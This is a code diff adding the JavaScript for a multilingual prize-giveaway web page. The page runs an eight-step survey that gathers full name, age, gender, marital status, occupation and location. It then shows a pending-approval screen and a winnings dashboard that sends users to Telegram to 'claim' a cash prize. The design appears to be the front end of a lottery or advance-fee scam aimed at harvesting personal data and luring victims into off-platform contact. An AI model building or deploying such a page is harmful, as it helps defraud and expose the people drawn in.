+    const totalSteps = 8;
+    const surveyData = { name:'', age:'', gender:'', marital:'', occupation:'', location:'', whatdo:'', whywin:'' };
+    const radioSelections = { gender: null, marital: null };
+
+    window.selectOption = (el, field, value) => { el.parentElement.querySelectorAll('.radio-option').forEach(o => o.classList.remove('selected')); el.classList.add('selected'); radioSelections[field] = value; };
+
+    window.nextStep = () => {
+        clearError('surveyError');
+        if (currentStep === 1) { const v = document.getElementById('s-name').value.trim(); if (!v) { showError('surveyError', 'Please enter your full name.'); return; } surveyData.name = v; }
+        else if (currentStep === 2) { const v = document.getElementById('s-age').value.trim(); if (!v || v < 16) { showError('surveyError', 'Please enter a valid age (16+).'); return; } surveyData.age = v; }
+        else if (currentStep === 3) { if (!radioSelections.gender) { showError('surveyError', 'Please select your gender.'); return; } surveyData.gender = radioSelections.gender; }
+        else if (currentStep === 4) { if (!radioSelections.marital) { showError('surveyError', 'Please select your marital status.'); return; } surveyData.marital = radioSelections.marital; }
+        else if (currentStep === 5) { const v = document.getElementById('s-occupation').value.trim(); if (!v) { showError('surveyError', 'Please enter your occupation.'); return; } surveyData.occupation = v; }
+        else if (currentStep === 6) { const v = document.getElementById('s-location').value.trim(); if (!v) { showError('surveyError', 'Please enter your location.'); return; } surveyData.location = v; }
+        else if (currentStep === 7) { const v = document.getElementById('s-whatdo').value.trim(); if (!v) { showError('surveyError', 'Please answer this question.'); return; } surveyData.whatdo = v; }
+        else if (currentStep === 8) { const v = document.getElementById('s-whywin').value.trim(); if (!v) { showError('surveyError', 'Please answer this question.'); return; } surveyData.whywin = v; submitSurvey(surveyData); return; }
+        currentStep++; updateSurveyUI();
+    };
+
+    window.prevStep = () => { if (currentStep > 1) { currentStep--; updateSurveyUI(); } };
+
+    function updateSurveyUI() {
+        const t = getT();
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById(`step${currentStep}`).classList.add('active');
+        document.getElementById('progressFill').style.width = `${(currentStep / totalSteps) * 100}%`;
+        document.getElementById('stepLabel').textContent = `${t.step} ${currentStep} ${t.of} ${totalSteps}`;
+        document.getElementById('surveyTitle').textContent = t.titles[currentStep - 1];
+        document.getElementById('surveySubtitle').textContent = t.subs[currentStep - 1];
+        document.getElementById('prevBtn').style.display = currentStep > 1 ? 'block' : 'none';
+        document.getElementById('nextBtn').textContent = currentStep === totalSteps ? t.submitBtn : t.nextBtn;
+        document.getElementById('prevBtn').textContent = t.prevBtn;
+        clearError('surveyError');
+    }
+
+    // LANGUAGE
+    window._lang = localStorage.getItem('wb_lang') || 'en';
+    window._selectedLang = window._lang;
+    function getT() { return TRANSLATIONS[window._lang] || TRANSLATIONS.en; }
+
+    window.selectLang = (code, el) => { window._selectedLang = code; document.querySelectorAll('.lang-option').forEach(o => o.classList.remove('selected')); el.classList.add('selected'); };
+    window.confirmLang = () => { window._lang = window._selectedLang; localStorage.setItem('wb_lang', window._lang); applyTranslations(window._lang); showScreen('authScreen'); };
+
+    function applyTranslations(lang) {
+        const t = TRANSLATIONS[lang] || TRANSLATIONS.en;
+        const set = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = val; };
+        const ph = (id, val) => { const el = document.getElementById(id); if (el) el.placeholder = val; };
+        set('currentLangFlag', t.flag); set('currentLangName', t.name);
+        set('t-tagline', t.tagline); set('signupTab', t.signup); set('loginTab', t.login);
+        set('t-suEmailLabel', t.emailLabel); set('t-liEmailLabel', t.emailLabel);
+        set('t-suPasswordLabel', t.passwordLabel); set('t-liPasswordLabel', t.passwordLabel);
+        set('signupBtn', t.signupBtn); set('loginBtn', t.loginBtn);
+        set('t-rememberMe', t.rememberMe); set('t-rememberSub', t.rememberSub);
+        set('t-forgotPw', t.forgotPw); set('t-needHelp', t.needHelp); set('t-tgSupport', t.telegramSupport);
+        set('t-nameLabel', t.nameLabel); set('t-ageLabel', t.ageLabel);
+        set('t-genderLabel', t.genderLabel); set('t-maritalLabel', t.maritalLabel);
+        set('t-occupationLabel', t.occupationLabel); set('t-locationLabel', t.locationLabel);
+        set('t-whatdoLabel', t.whatdoLabel); set('t-whywinLabel', t.whywinLabel);
+        set('opt-male', t.male); set('opt-female', t.female);
+        set('opt-single', t.single); set('opt-married', t.married);
+        ph('s-name', t.namePh); ph('s-age', t.agePh); ph('s-occupation', t.occupationPh);
+        ph('s-location', t.locationPh); ph('s-whatdo', t.whatdoPh); ph('s-whywin', t.whywinPh);
+        set('t-pendingTitle', t.pendingTitle); set('t-pendingText', t.pendingText); set('t-pendingText2', t.pendingText2);
+        set('t-whatNext', t.whatNext); set('t-step1txt', t.step1txt); set('t-step2txt', t.step2txt); set('t-step3txt', t.step3txt);
+        set('t-lockedMsg', t.lockedMsg); set('t-logout', t.logout);
+        set('t-approvedBadge', t.approved); set('t-dashLogout', t.logout2 || t.login);
+        set('t-prizesWaiting', t.prizesWaiting); set('t-cashPrizeTitle', t.cashPrize);
+        set('t-totalWinnings', t.totalWinnings); set('t-prizesWonTitle', t.prizesWon);
+        set('t-readyToClaim', t.readyToClaim); set('t-contactSub', t.contactSub); set('t-telegramBtn', t.telegramBtn);
+    }
+
+    const TRANSLATIONS = {
+        en: { flag:'🇬🇧',name:'English',tagline:'Answer & Win Amazing Prizes',signup:'Sign Up',login:'Login',emailLabel:'Email Address',passwordLabel:'Password',signupBtn:'Create Account →',loginBtn:'Login →',rememberMe:'Remember Me',rememberSub:'Auto-login next time',forgotPw:'🔑 Forgot Password?',telegramSupport:'✈️ Telegram Support',needHelp:'Need help? Contact us',step:'STEP',of:'OF',titles:['Tell us your name','How old are you?','What\'s your gender?','Marital status?','What do you do?','Where are you from?','What would you do with your prize?','Why do you deserve to win?'],subs:['Let\'s get to know you','Age helps us tailor prizes','Select one option','Select one option','Tell us your occupation','Your city and country','Be specific and creative!','This is your chance to shine!'],nameLabel:'Full Name',namePh:'Enter your full name',ageLabel:'Your Age',agePh:'Enter your age',genderLabel:'Gender',male:'👨 Male',female:'👩 Female',maritalLabel:'Marital Status',single:'💫 Single',married:'💍 Married',occupationLabel:'Occupation',occupationPh:'e.g. Teacher, Business Owner...',locationLabel:'City / Country',locationPh:'e.g. London, Paris, New York, Dubai, Lagos...',whatdoLabel:'What would you do with your prize?',whatdoPh:'Tell us what you would do if you won...',whywinLabel:'Why do you deserve to win?',whywinPh:'Tell us why you should be a winner...',nextBtn:'Next →',prevBtn:'← Back',submitBtn:'Submit Application ✓',pendingTitle:'Application Submitted!',pendingText:'Thank you',pendingText2:' Your application is being reviewed. Please wait for approval!',whatNext:'WHAT HAPPENS NEXT',step1txt:'Our team reviews your application',step2txt:'You get approved and your dashboard unlocks',step3txt:'Contact us on Telegram to claim your prize!',lockedMsg:'🔒 Contact button unlocks after approval',logout:'← Logout',logout2:'Logout',welcomeBack:'Welcome back,',prizesWaiting:'Your prizes are waiting for you',cashPrize:'💰 CASH PRIZE',totalWinnings:'Total Winnings',noCash:'No prize assigned yet',prizesWon:'🎁 PRIZES WON',readyToClaim:'Ready to claim your prize?',contactSub:'Contact us on Telegram to arrange delivery',telegramBtn:'✈️ Message on Telegram',approved:'✓ APPROVED',awarded:'AWARDED' },
+        fr: { flag:'🇫🇷',name:'Français',tagline:'Répondez & Gagnez des Prix Incroyables',signup:'S\'inscrire',login:'Connexion',emailLabel:'Adresse Email',passwordLabel:'Mot de passe',signupBtn:'Créer un compte →',loginBtn:'Se connecter →',rememberMe:'Se souvenir de moi',rememberSub:'Connexion auto la prochaine fois',forgotPw:'🔑 Mot de passe oublié?',telegramSupport:'✈️ Support Telegram',needHelp:'Besoin d\'aide? Contactez-nous',step:'ÉTAPE',of:'SUR',titles:['Votre nom','Quel âge avez-vous?','Quel est votre genre?','Situation matrimoniale?','Quelle est votre profession?','D\'où venez-vous?','Que feriez-vous avec votre prix?','Pourquoi méritez-vous de gagner?'],subs:['Faisons connaissance','L\'âge nous aide à personnaliser','Sélectionnez une option','Sélectionnez une option','Dites-nous votre profession','Votre ville et pays','Soyez précis et créatif!','C\'est votre chance de briller!'],nameLabel:'Nom complet',namePh:'Entrez votre nom complet',ageLabel:'Votre âge',agePh:'Entrez votre âge',genderLabel:'Genre',male:'👨 Homme',female:'👩 Femme',maritalLabel:'Situation matrimoniale',single:'💫 Célibataire',married:'💍 Marié(e)',occupationLabel:'Profession',occupationPh:'ex. Enseignant, Chef d\'entreprise...',locationLabel:'Ville / Pays',locationPh:'ex. Paris, Londres, New York, Dubaï, Lagos...',whatdoLabel:'Que feriez-vous avec votre prix?',whatdoPh:'Dites-nous ce que vous feriez...',whywinLabel:'Pourquoi méritez-vous de gagner?',whywinPh:'Dites-nous pourquoi vous devriez gagner...',nextBtn:'Suivant →',prevBtn:'← Retour',submitBtn:'Soumettre ✓',pendingTitle:'Candidature soumise!',pendingText:'Merci',pendingText2:' Votre candidature est en cours d\'examen. Attendez l\'approbation!',whatNext:'CE QUI SE PASSE ENSUITE',step1txt:'Notre équipe examine votre candidature',step2txt:'Vous êtes approuvé et votre tableau de bord se déverrouille',step3txt:'Contactez-nous sur Telegram pour réclamer votre prix!',lockedMsg:'🔒 Bouton déverrouillé après approbation',logout:'← Déconnexion',logout2:'Déconnexion',welcomeBack:'Bon retour,',prizesWaiting:'Vos prix vous attendent',cashPrize:'💰 PRIX EN ESPÈCES',totalWinnings:'Gains totaux',noCash:'Aucun prix encore',prizesWon:'🎁 PRIX GAGNÉS',readyToClaim:'Prêt à réclamer votre prix?',contactSub:'Contactez-nous sur Telegram',telegramBtn:'✈️ Message sur Telegram',approved:'✓ APPROUVÉ',awarded:'ATTRIBUÉ' },
+        es: { flag:'🇪🇸',name:'Español',tagline:'Responde & Gana Premios Increíbles',signup:'Registrarse',login:'Iniciar sesión',emailLabel:'Correo Electrónico',passwordLabel:'Contraseña',signupBtn:'Crear cuenta →',loginBtn:'Iniciar sesión →',rememberMe:'Recuérdame',rememberSub:'Inicio de sesión automático',forgotPw:'🔑 ¿Olvidaste tu contraseña?',telegramSupport:'✈️ Soporte Telegram',needHelp:'¿Necesitas ayuda? Contáctanos',step:'PASO',of:'DE',titles:['Dinos tu nombre','¿Cuántos años tienes?','¿Cuál es tu género?','¿Estado civil?','¿A qué te dedicas?','¿De dónde eres?','¿Qué harías con tu premio?','¿Por qué mereces ganar?'],subs:['Vamos a conocerte','La edad nos ayuda a personalizar','Selecciona una opción','Selecciona una opción','Cuéntanos tu ocupación','Tu ciudad y país','¡Sé específico y creativo!','¡Esta es tu oportunidad!'],nameLabel:'Nombre completo',namePh:'Ingresa tu nombre completo',ageLabel:'Tu edad',agePh:'Ingresa tu edad',genderLabel:'Género',male:'👨 Masculino',female:'👩 Femenino',maritalLabel:'Estado civil',single:'💫 Soltero/a',married:'💍 Casado/a',occupationLabel:'Ocupación',occupationPh:'ej. Maestro, Empresario...',locationLabel:'Ciudad / País',locationPh:'ej. Madrid, París, Nueva York, Dubái, Lagos...',whatdoLabel:'¿Qué harías con tu premio?',whatdoPh:'Cuéntanos qué harías si ganaras...',whywinLabel:'¿Por qué mereces ganar?',whywinPh:'Cuéntanos por qué deberías ganar...',nextBtn:'Siguiente →',prevBtn:'← Atrás',submitBtn:'Enviar solicitud ✓',pendingTitle:'¡Solicitud enviada!',pendingText:'Gracias',pendingText2:' Tu solicitud está siendo revisada. ¡Espera la aprobación!',whatNext:'QUÉ PASA DESPUÉS',step1txt:'Nuestro equipo revisa tu solicitud',step2txt:'Eres aprobado y tu panel se desbloquea',step3txt:'¡Contáctanos en Telegram para reclamar tu premio!',lockedMsg:'🔒 El botón se desbloquea tras la aprobación',logout:'← Cerrar sesión',logout2:'Cerrar sesión',welcomeBack:'¡Bienvenido,',prizesWaiting:'Tus premios te esperan',cashPrize:'💰 PREMIO EN EFECTIVO',totalWinnings:'Ganancias totales',noCash:'Sin premio asignado aún',prizesWon:'🎁 PREMIOS GANADOS',readyToClaim:'¿Listo para reclamar?',contactSub:'Contáctanos en Telegram',telegramBtn:'✈️ Mensaje en Telegram',approved:'✓ APROBADO',awarded:'OTORGADO' },
+        pt: { flag:'🇵🇹',name:'Português',tagline:'Responda & Ganhe Prêmios Incríveis',signup:'Cadastrar',login:'Entrar',emailLabel:'Endereço de Email',passwordLabel:'Senha',signupBtn:'Criar conta →',loginBtn:'Entrar →',rememberMe:'Lembrar de mim',rememberSub:'Login automático na próxima vez',forgotPw:'🔑 Esqueceu a senha?',telegramSupport:'✈️ Suporte Telegram',needHelp:'Precisa de ajuda? Fale conosco',step:'PASSO',of:'DE',titles:['Nos diga seu nome','Quantos anos você tem?','Qual é o seu gênero?','Estado civil?','O que você faz?','De onde você é?','O que faria com seu prêmio?','Por que você merece ganhar?'],subs:['Vamos nos conhecer','A idade nos ajuda a personalizar','Selecione uma opção','Selecione uma opção','Conte-nos sua ocupação','Sua cidade e país','Seja específico e criativo!','Esta é sua chance de brilhar!'],nameLabel:'Nome completo',namePh:'Digite seu nome completo',ageLabel:'Sua idade',agePh:'Digite sua idade',genderLabel:'Gênero',male:'👨 Masculino',female:'👩 Feminino',maritalLabel:'Estado civil',single:'💫 Solteiro/a',married:'💍 Casado/a',occupationLabel:'Ocupação',occupationPh:'ex. Professor, Empresário...',locationLabel:'Cidade / País',locationPh:'ex. Lisboa, Paris, Nova York, Dubai, Lagos...',whatdoLabel:'O que faria com seu prêmio?',whatdoPh:'Conte-nos o que faria se ganhasse...',whywinLabel:'Por que você merece ganhar?',whywinPh:'Conte-nos por que você deveria ganhar...',nextBtn:'Próximo →',prevBtn:'← Voltar',submitBtn:'Enviar candidatura ✓',pendingTitle:'Candidatura enviada!',pendingText:'Obrigado',pendingText2:' Sua candidatura está sendo revisada. Aguarde a aprovação!',whatNext:'O QUE ACONTECE DEPOIS',step1txt:'Nossa equipe analisa sua candidatura',step2txt:'Você é aprovado e seu painel é desbloqueado',step3txt:'Entre em contato pelo Telegram para reclamar seu prêmio!',lockedMsg:'🔒 Botão desbloqueado após aprovação',logout:'← Sair',logout2:'Sair',welcomeBack:'Bem-vindo,',prizesWaiting:'Seus prêmios estão esperando',cashPrize:'💰 PRÊMIO EM DINHEIRO',totalWinnings:'Ganhos totais',noCash:'Nenhum prêmio atribuído ainda',prizesWon:'🎁 PRÊMIOS GANHOS',readyToClaim:'Pronto para reivindicar?',contactSub:'Entre em contato pelo Telegram',telegramBtn:'✈️ Mensagem no Telegram',approved:'✓ APROVADO',awarded:'ATRIBUÍDO' },
+        ar: { flag:'🇸🇦',name:'العربية',tagline:'أجب واربح جوائز رائعة',signup:'إنشاء حساب',login:'تسجيل الدخول',emailLabel:'البريد الإلكتروني',passwordLabel:'كلمة المرور',signupBtn:'إنشاء حساب ←',loginBtn:'دخول ←',rememberMe:'تذكرني',rememberSub:'تسجيل الدخول تلقائياً',forgotPw:'🔑 نسيت كلمة المرور؟',telegramSupport:'✈️ دعم تيليغرام',needHelp:'تحتاج مساعدة؟ تواصل معنا',step:'خطوة',of:'من',titles:['أخبرنا باسمك','كم عمرك؟','ما جنسك؟','الحالة الاجتماعية؟','ماذا تعمل؟','من أين أنت؟','ماذا ستفعل بجائزتك؟','لماذا تستحق الفوز؟'],subs:['دعنا نتعرف عليك','العمر يساعدنا في التخصيص','اختر خياراً واحداً','اختر خياراً واحداً','أخبرنا عن مهنتك','مدينتك وبلدك','كن محدداً ومبدعاً!','هذه فرصتك للتألق!'],nameLabel:'الاسم الكامل',namePh:'أدخل اسمك الكامل',ageLabel:'عمرك',agePh:'أدخل عمرك',genderLabel:'الجنس',male:'👨 ذكر',female:'👩 أنثى',maritalLabel:'الحالة الاجتماعية',single:'💫 أعزب',married:'💍 متزوج',occupationLabel:'المهنة',occupationPh:'مثل: معلم، رجل أعمال...',locationLabel:'المدينة / البلد',locationPh:'مثل: دبي، باريس، لندن، نيويورك، لاغوس...',whatdoLabel:'ماذا ستفعل بجائزتك؟',whatdoPh:'أخبرنا ماذا ستفعل إذا فزت...',whywinLabel:'لماذا تستحق الفوز؟',whywinPh:'أخبرنا لماذا يجب أن تكون الفائز...',nextBtn:'التالي →',prevBtn:'← رجوع',submitBtn:'إرسال الطلب ✓',pendingTitle:'تم تقديم الطلب!',pendingText:'شكراً',pendingText2:' طلبك قيد المراجعة. انتظر الموافقة!',whatNext:'ما الذي سيحدث بعد ذلك',step1txt:'فريقنا يراجع طلبك',step2txt:'تتم الموافقة عليك ويفتح لوحة تحكمك',step3txt:'تواصل معنا عبر تيليغرام للمطالبة بجائزتك!',lockedMsg:'🔒 زر التواصل يفتح بعد الموافقة',logout:'← خروج',logout2:'خروج',welcomeBack:'مرحباً،',prizesWaiting:'جوائزك في انتظارك',cashPrize:'💰 الجائزة النقدية',totalWinnings:'إجمالي الأرباح',noCash:'لا توجد جائزة بعد',prizesWon:'🎁 الجوائز المكتسبة',readyToClaim:'هل أنت مستعد للمطالبة؟',contactSub:'تواصل معنا عبر تيليغرام',telegramBtn:'✈️ رسالة على تيليغرام',approved:'✓ موافق عليه',awarded:'تم التخصيص' },
+        ha: { flag:'🇳🇬',name:'Hausa',tagline:'Amsa & Lashe Kyaututtuka',signup:'Yi Rajista',login:'Shiga',emailLabel:'Adireshin Imel',passwordLabel:'Kalmar Sirri',signupBtn:'Ƙirƙiri Asusun →',loginBtn:'Shiga →',rememberMe:'Tuna ni',rememberSub:'Shiga atomatik karo na gaba',forgotPw:'🔑 Manta Kalmar Sirri?',telegramSupport:'✈️ Tallafi ta Telegram',needHelp:'Kuna bukata taimako? Tuntuɓe mu',step:'MATAKI',of:'NA',titles:['Faɗa mana sunanka','Shekara nawa?','Menene jinsinku?','Halin aure?','Menene sana\'arka?','Daga ina kake?','Me zaka yi da kyautarka?','Me ya sa kake cancanci?'],subs:['Bari mu san juna','Shekarun suna taimakawa','Zaɓi zaɓi ɗaya','Zaɓi zaɓi ɗaya','Faɗa mana sana\'arka','Birnin ka da ƙasarku','Zama takamaiman!','Wannan shine dama naka!'],nameLabel:'Sunan Cikakke',namePh:'Shigar da sunanka na cikakke',ageLabel:'Shekarunka',agePh:'Shigar da shekarunka',genderLabel:'Jinsi',male:'👨 Namiji',female:'👩 Mace',maritalLabel:'Halin Aure',single:'💫 Ɗan Banza',married:'💍 Aure',occupationLabel:'Sana\'a',occupationPh:'misali. Malami, Mai Kasuwanci...',locationLabel:'Gari / Ƙasa',locationPh:'misali. Landan, Paris, New York, Dubai, Lagos...',whatdoLabel:'Me zaka yi da kyautarka?',whatdoPh:'Faɗa mana abin da zaka yi...',whywinLabel:'Me ya sa kake cancanci?',whywinPh:'Faɗa mana dalilin da ya sa ya kamata ka lashe...',nextBtn:'Na gaba →',prevBtn:'← Baya',submitBtn:'Aika Aikace-aikace ✓',pendingTitle:'An Tura Aikace-aikace!',pendingText:'Na gode',pendingText2:' Ana duba aikace-aikacenka. Da fatan za a jira amincewar!',whatNext:'ABIN DA ZAI FARU GABA',step1txt:'Ƙungiyarmu tana duba aikace-aikacenka',step2txt:'An amince da kai kuma dashboard ɗinka ya buɗe',step3txt:'Tuntuɓe mu a Telegram don neman kyautarka!',lockedMsg:'🔒 Maballin tuntuɓe ya buɗe bayan amincewar',logout:'← Fita',logout2:'Fita',welcomeBack:'Barka da dawowa,',prizesWaiting:'Kyaututtukanka suna jiranka',cashPrize:'💰 KYAUTAR KUDI',totalWinnings:'Jimlar Riba',noCash:'Babu kyauta tukuna',prizesWon:'🎁 KYAUTUTTUKA',readyToClaim:'Shirye don neman kyautarka?',contactSub:'Tuntuɓe mu a Telegram',telegramBtn:'✈️ Saƙo a Telegram',approved:'✓ AN AMINCE',awarded:'AN BADA' },
+        yo: { flag:'🇳🇬',name:'Yorùbá',tagline:'Dahun & Gba Awọn Ẹbun Iyanu',signup:'Forukọsilẹ',login:'Wọle',emailLabel:'Adirẹsi Imeeli',passwordLabel:'Ọrọ Aṣina',signupBtn:'Ṣẹda Akọọlẹ →',loginBtn:'Wọle →',rememberMe:'Ranti mi',rememberSub:'Wọle laifọwọyi ni igba miiran',forgotPw:'🔑 Gbagbe Ọrọ Aṣina?',telegramSupport:'✈️ Atilẹyin Telegram',needHelp:'Nilo iranlọwọ? Kan si wa',step:'IGẸ̀DI',of:'TI',titles:['Sọ orukọ rẹ','Ọmọ ọdún mélòó ni o?','Kini abo rẹ?','Ipò ìgbéyàwó?','Kini o n ṣe?','Ibo ni o ti wá?','Kini iwọ yoo ṣe pẹlu ẹbun rẹ?','Kini idi ti o yẹ ki o bori?'],subs:['Jẹ ki a mọ ara wa','Ọjọ ori ṣe iranlọwọ','Yan aṣayan kan','Yan aṣayan kan','Sọ iṣẹ rẹ','Ilu ati orilẹ-ede rẹ','Jẹ pato ati ẹda!','Eyi ni anfani rẹ!'],nameLabel:'Orukọ Ni Kikun',namePh:'Tẹ orukọ rẹ ni kikun sii',ageLabel:'Ọjọ ori rẹ',agePh:'Tẹ ọjọ ori rẹ sii',genderLabel:'Abo',male:'👨 Akọ',female:'👩 Abo',maritalLabel:'Ipò Ìgbéyàwó',single:'💫 Ẹyọkan',married:'💍 Ìgbéyàwó',occupationLabel:'Iṣẹ',occupationPh:'apẹẹrẹ. Olùkọ́, Oṣiṣẹ Iṣowo...',locationLabel:'Ilu / Orilẹ-ede',locationPh:'apẹẹrẹ. Lọndọnu, Paris, New York, Dubai, Lagos...',whatdoLabel:'Kini iwọ yoo ṣe pẹlu ẹbun rẹ?',whatdoPh:'Sọ fun wa ohun ti iwọ yoo ṣe...',whywinLabel:'Kini idi ti o yẹ ki o bori?',whywinPh:'Sọ fun wa idi ti o yẹ ki o jẹ ọlọgún...',nextBtn:'Tẹle →',prevBtn:'← Pada',submitBtn:'Firanṣẹ Ohun elo ✓',pendingTitle:'Ohun elo Ti Firanṣẹ!',pendingText:'E dupe',pendingText2:' Ohun elo rẹ n ṣe atunyẹwo. Jọwọ duro fun ifọwọsi!',whatNext:'OHUN TI YOO ṢẸLẸ LẸHINNA',step1txt:'Ẹgbẹ wa n ṣe atunyẹwo ohun elo rẹ',step2txt:'A fọwọsi rẹ ati pe dashboard rẹ ṣii',step3txt:'Kan si wa lori Telegram lati beere ẹbun rẹ!',lockedMsg:'🔒 Bọtini n ṣii lẹhin ifọwọsi',logout:'← Jade',logout2:'Jade',welcomeBack:'Ẹ káàbọ̀,',prizesWaiting:'Awọn ẹbun rẹ n duro de ọ',cashPrize:'💰 ẸBUN ỌWỌ',totalWinnings:'Apapọ Ere',noCash:'Ko si ẹbun sibẹ',prizesWon:'🎁 AWỌN ẸBUN',readyToClaim:'Ṣetan lati beere ẹbun rẹ?',contactSub:'Kan si wa lori Telegram',telegramBtn:'✈️ Ifiranṣẹ lori Telegram',approved:'✓ FỌ̀WÒ SÍ',awarded:'FUN NI' },
+        ig: { flag:'🇳🇬',name:'Igbo',tagline:'Zaghachi & Merie Ihe Nrite',signup:'Debanye Aha',login:'Banye',emailLabel:'Adreesị Ozi',passwordLabel:'Okwuntughe',signupBtn:'Mepụta Akaụntụ →',loginBtn:'Banye →',rememberMe:'Chetara m',rememberSub:'Banye ozugbo oge ọzọ',forgotPw:'🔑 Chefuo Okwuntughe?',telegramSupport:'✈️ Nkwado Telegram',needHelp:'Chọrọ enyemaka? Kpọtụrụ anyị',step:'NZỌỤKWỤ',of:'NKE',titles:['Gwa anyị aha gị','Afọ ole nwere gị?','Gịnị bụ okike gị?','Ọnọdụ alụmdi?','Gịnị ka i na-eme?','Ebee ka i si?','Gịnị ga-eme ya na ihe nrite gị?','Gịnị mere i kwesịrị imerịta?'],subs:['Ka anyị mara onwe anyị','Afọ na-enyere anyị aka','Họrọ nhọrọ otu','Họrọ nhọrọ otu','Gwa anyị ọrụ gị','Obodo na mba gị','Bụrụ nke a ma ama!','Nke a bụ ohere gị!'],nameLabel:'Aha Zuru Oke',namePh:'Tinye aha zuru oke gị',ageLabel:'Afọ gị',agePh:'Tinye afọ gị',genderLabel:'Okike',male:'👨 Nwoke',female:'👩 Nwanyị',maritalLabel:'Ọnọdụ Alụmdi',single:'💫 Onye Nweghị Di',married:'💍 Lụrụ Alụm',occupationLabel:'Ọrụ',occupationPh:'dịka. Onye nkuzi, Onye ọchụnta ego...',locationLabel:'Obodo / Mba',locationPh:'dịka. London, Paris, New York, Dubai, Lagos...',whatdoLabel:'Gịnị ga-eme ya na ihe nrite gị?',whatdoPh:'Gwa anyị ihe ga-eme ma ọ bụrụ na ị merịta...',whywinLabel:'Gịnị mere i kwesịrị imerịta?',whywinPh:'Gwa anyị ihe mere i kwesịrị bụrụ onye merịtara...',nextBtn:'Ọzọ →',prevBtn:'← Laghachi',submitBtn:'Ziga Arịọ ✓',pendingTitle:'Ezigara Arịọ!',pendingText:'Daalụ',pendingText2:' Ana atụle arịọ gị. Biko chere nkwado!',whatNext:'IHEỌZỌ GA-EMECHI',step1txt:'Otu anyị na-atụle arịọ gị',step2txt:'Akwadoro gị ma dashboard gị emeghe',step3txt:'Kpọtụrụ anyị na Telegram iji nweta ihe nrite gị!',lockedMsg:'🔒 Bọtịnụ emeghe mgbe akwadoro',logout:'← Pụọ',logout2:'Pụọ',welcomeBack:'Nnọọ laghachi,',prizesWaiting:'Ihe nrite gị na-echere gị',cashPrize:'💰 IHENRITE EGO',totalWinnings:'Ngụkọta Ọla',noCash:'Enweghị ihe nrite ka',prizesWon:'🎁 IHENRITE',readyToClaim:'Dị njikere iji nweta ihe nrite?',contactSub:'Kpọtụrụ anyị na Telegram',telegramBtn:'✈️ Ozi na Telegram',approved:'✓ AKWADORO',awarded:'NYERE' }
+    };
+
+    applyTranslations(window._lang);
+    if (localStorage.getItem('wb_lang')) showScreen('authScreen');
+</script>
+</body>
+</html>
